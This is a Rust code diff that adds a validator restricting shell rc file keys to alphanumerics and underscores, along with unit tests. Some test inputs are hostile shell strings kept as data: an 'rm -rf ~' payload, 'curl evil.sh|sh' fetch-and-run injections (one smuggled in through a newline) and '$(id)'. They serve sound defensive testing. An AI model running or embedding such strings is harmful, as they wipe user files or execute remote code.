@@ -56,6 +56,21 @@ pub fn validate_rc_value(value: &str) -> Result<(), String> {
     }
 }
 
+pub mod path_guard;
+
+/// 校验 rc 文件中的 key / 名称（`export KEY=`、`# DevNexus: <name>` 标签等）。
+/// 仅允许字母、数字、下划线，防止换行逃逸注入 shell rc 文件。
+pub fn validate_rc_key(key: &str) -> Result<(), String> {
+    if key.is_empty() || key.len() > 128 {
+        return Err("Key/name is empty or too long".to_string());
+    }
+    if key.chars().all(|c| c.is_ascii_alphanumeric() || c == '_') {
+        Ok(())
+    } else {
+        Err("Key/name contains unsafe characters (only [A-Za-z0-9_] allowed)".to_string())
+    }
+}
+
 pub fn find_cmd_path(cmd: &str) -> Option<String> {
     if let Ok(p) = which::which(cmd) {
         return Some(p.to_string_lossy().to_string());
@@ -124,7 +139,7 @@ pub fn find_cmd_path(cmd: &str) -> Option<String> {
 
 #[cfg(test)]
 mod tests {
-    use super::validate_rc_value;
+    use super::{validate_rc_key, validate_rc_value};
 
     #[test]
     fn test_validate_rc_value() {
@@ -133,5 +148,24 @@ mod tests {
         assert!(validate_rc_value("\"; rm -rf ~; #").is_err());
         assert!(validate_rc_value("$(curl evil.sh|sh)").is_err());
         assert!(validate_rc_value("").is_err());
+    }
+
+    #[test]
+    fn test_validate_rc_key_accepts_safe_names() {
+        assert!(validate_rc_key("GOPROXY").is_ok());
+        assert!(validate_rc_key("java_17").is_ok());
+        assert!(validate_rc_key("NodeJS20").is_ok());
+    }
+
+    #[test]
+    fn test_validate_rc_key_rejects_injection() {
+        // 换行逃逸：向 rc 文件注入任意命令
+        assert!(validate_rc_key("x\ncurl evil.sh|sh\n#").is_err());
+        assert!(validate_rc_key("a; b").is_err());
+        assert!(validate_rc_key("a&b").is_err());
+        assert!(validate_rc_key("$(id)").is_err());
+        assert!(validate_rc_key("a b").is_err());
+        assert!(validate_rc_key("").is_err());
+        assert!(validate_rc_key("-rf").is_err());
     }
 }
